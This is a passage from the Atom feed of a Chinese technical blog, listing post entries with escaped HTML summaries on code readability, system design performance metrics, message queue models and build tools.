      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="分布式" scheme="https://sometwo7.github.io/blog/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 代码可读性</title>
    <link href="https://sometwo7.github.io/blog/1c7cd43d.html"/>
    <id>https://sometwo7.github.io/blog/1c7cd43d.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、可读性的重要性&quot;&gt;&lt;a href=&quot;#一、可读性的重要性&quot; class=&quot;headerlink&quot; title=&quot;一、可读性的重要性&quot;&gt;&lt;/a&gt;一、可读性的重要性&lt;/h1&gt;&lt;p&gt;编程有很大一部分时间是在阅读代码，不仅要阅读自己的代码，而且要阅读别人的代码。因此，可读性良好的代码能够大大提高编程效率。&lt;/p&gt;&lt;p&gt;可读性良好的代码往往会让代码架构更好，因为程序员更愿意去修改这部分代码，而且也更容易修改。&lt;/p&gt;&lt;p&gt;只有在核心领域为了效率才可以放弃可读性，否则可读性是第一位。&lt;/p&gt;&lt;h1 id=&quot;二、用名字表达代码含义&quot;&gt;&lt;a href=&quot;#二、用名字表达代码含义&quot; class=&quot;headerlink&quot; title=&quot;二、用名字表达代码含义&quot;&gt;&lt;/a&gt;二、用名字表达代码含义&lt;/h1&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="代码" scheme="https://sometwo7.github.io/blog/tags/%E4%BB%A3%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 系统设计基础</title>
    <link href="https://sometwo7.github.io/blog/bf574124.html"/>
    <id>https://sometwo7.github.io/blog/bf574124.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、性能&quot;&gt;&lt;a href=&quot;#一、性能&quot; class=&quot;headerlink&quot; title=&quot;一、性能&quot;&gt;&lt;/a&gt;一、性能&lt;/h1&gt;&lt;h2 id=&quot;性能指标&quot;&gt;&lt;a href=&quot;#性能指标&quot; class=&quot;headerlink&quot; title=&quot;性能指标&quot;&gt;&lt;/a&gt;性能指标&lt;/h2&gt;&lt;h3 id=&quot;1-响应时间&quot;&gt;&lt;a href=&quot;#1-响应时间&quot; class=&quot;headerlink&quot; title=&quot;1. 响应时间&quot;&gt;&lt;/a&gt;1. 响应时间&lt;/h3&gt;&lt;p&gt;指某个请求从发出到接收到响应消耗的时间。&lt;/p&gt;&lt;p&gt;在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。&lt;/p&gt;&lt;h3 id=&quot;2-吞吐量&quot;&gt;&lt;a href=&quot;#2-吞吐量&quot; class=&quot;headerlink&quot; title=&quot;2. 吞吐量&quot;&gt;&lt;/a&gt;2. 吞吐量&lt;/h3&gt;&lt;p&gt;指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。&lt;/p&gt;&lt;h3 id=&quot;3-并发用户数&quot;&gt;&lt;a href=&quot;#3-并发用户数&quot; class=&quot;headerlink&quot; title=&quot;3. 并发用户数&quot;&gt;&lt;/a&gt;3. 并发用户数&lt;/h3&gt;&lt;p&gt;指系统能同时处理的并发用户请求数量。&lt;/p&gt;&lt;p&gt;在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="系统设计" scheme="https://sometwo7.github.io/blog/tags/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 消息队列</title>
    <link href="https://sometwo7.github.io/blog/51d10326.html"/>
    <id>https://sometwo7.github.io/blog/51d10326.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、消息模型&quot;&gt;&lt;a href=&quot;#一、消息模型&quot; class=&quot;headerlink&quot; title=&quot;一、消息模型&quot;&gt;&lt;/a&gt;一、消息模型&lt;/h1&gt;&lt;h2 id=&quot;点对点&quot;&gt;&lt;a href=&quot;#点对点&quot; class=&quot;headerlink&quot; title=&quot;点对点&quot;&gt;&lt;/a&gt;点对点&lt;/h2&gt;&lt;p&gt;消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/206f965e-53b2-4732-90cf-75910b80d7ac.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;h2 id=&quot;发布-订阅&quot;&gt;&lt;a href=&quot;#发布-订阅&quot; class=&quot;headerlink&quot; title=&quot;发布/订阅&quot;&gt;&lt;/a&gt;发布/订阅&lt;/h2&gt;&lt;p&gt;消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费。&lt;/p&gt;&lt;div align=&quot;center&quot;&gt; &lt;img src=&quot;pics/4e93f7d4-2623-4129-a939-59051256561e.png&quot; width=&quot;450px&quot;&gt; &lt;/div&gt;&lt;br&gt;&lt;p&gt;发布与订阅模式和观察者模式有以下不同：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，生产者与消费者不知道对方的存在，它们之间通过频道进行通信。&lt;/li&gt;
&lt;li&gt;观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="消息队列" scheme="https://sometwo7.github.io/blog/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>网络技术 - 构建工具</title>
    <link href="https://sometwo7.github.io/blog/4ad173cd.html"/>
    <id>https://sometwo7.github.io/blog/4ad173cd.html</id>
    <published>2019-11-05T10:02:11.000Z</published>
    <updated>2019-12-12T06:35:07.268Z</updated>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、构建工具的作用&quot;&gt;&lt;a href=&quot;#一、构建工具的作用&quot; class=&quot;headerlink&quot; title=&quot;一、构建工具的作用&quot;&gt;&lt;/a&gt;一、构建工具的作用&lt;/h1&gt;&lt;p&gt;构建工具是用于构建项目的自动化工具，主要包含以下工作：&lt;/p&gt;&lt;h2 id=&quot;依赖管理&quot;&gt;&lt;a href=&quot;#依赖管理&quot; class=&quot;headerlink&quot; title=&quot;依赖管理&quot;&gt;&lt;/a&gt;依赖管理&lt;/h2&gt;&lt;p&gt;不再需要手动导入 Jar 依赖包，并且可以自动处理依赖关系，也就是说某个依赖如果依赖于其它依赖，构建工具可以帮助我们自动处理这种依赖关系。&lt;/p&gt;&lt;h2 id=&quot;运行单元测试&quot;&gt;&lt;a href=&quot;#运行单元测试&quot; class=&quot;headerlink&quot; title=&quot;运行单元测试&quot;&gt;&lt;/a&gt;运行单元测试&lt;/h2&gt;&lt;p&gt;不再需要在项目代码中添加测试代码，从而避免了污染项目代码。&lt;/p&gt;&lt;h2 id=&quot;将源代码转化为可执行文件&quot;&gt;&lt;a href=&quot;#将源代码转化为可执行文件&quot; class=&quot;headerlink&quot; title=&quot;将源代码转化为可执行文件&quot;&gt;&lt;/a&gt;将源代码转化为可执行文件&lt;/h2&gt;
    
    </summary>
    
    
      <category term="网络技术" scheme="https://sometwo7.github.io/blog/categories/%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="构建工具" scheme="https://sometwo7.github.io/blog/tags/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
</feed>
